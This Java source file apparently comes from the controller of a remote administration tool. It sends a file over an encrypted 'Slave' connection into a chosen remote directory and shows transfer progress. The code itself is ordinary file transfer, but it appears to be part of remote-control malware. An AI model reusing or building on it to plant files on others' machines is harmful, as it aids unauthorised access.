package com.redpois0n;

import java.io.File;

import com.redpois0n.common.io.FileIO;
import com.redpois0n.common.io.TransferListener;
import com.redpois0n.packets.incoming.PacketBuilder;
import com.redpois0n.packets.outgoing.Header;
import com.redpois0n.ui.frames.FrameFileTransfer;
import com.redpois0n.ui.frames.FrameRemoteFiles;
import com.redpois0n.utils.Util;


public class SendFile {
	
	public static void sendFile(Slave slave, String file, String destdir) {
		sendFile(slave, new File(file), destdir);
	}

	public static void sendFile(final Slave slave, final File file, String destdir) {
		final FrameFileTransfer frame = FrameFileTransfer.instance;
		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
		
		if (frame2 != null) {
			frame2.start();
		}

		try {
			PacketBuilder builder = new PacketBuilder(Header.TAKE_FILE);
			
			builder.add(destdir);
			builder.add(file.getName());
			
			slave.addToSendQueue(builder);
			
			slave.lock();
			
			FileIO.writeFile(file, slave.getDataOutputStream(), new TransferListener() {
				public void transferred(long sent, long bytesSent, long totalBytes) {
					Traffic.increaseSent(slave, (int) bytesSent);
					if (frame != null) {
						frame.reportProgress(file.getAbsolutePath(), Util.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
					}
					if (frame2 != null) {
						frame2.reportProgress(file.getAbsolutePath(), Util.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
					}
				}		
			}, slave.getConnection().getKey().getKey());
			
			slave.lock();
			
			if (frame != null) {
				frame.done(file.getAbsolutePath(), file.length() + "");
			}
			if (frame2 != null) {
				frame2.done();
			}

		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
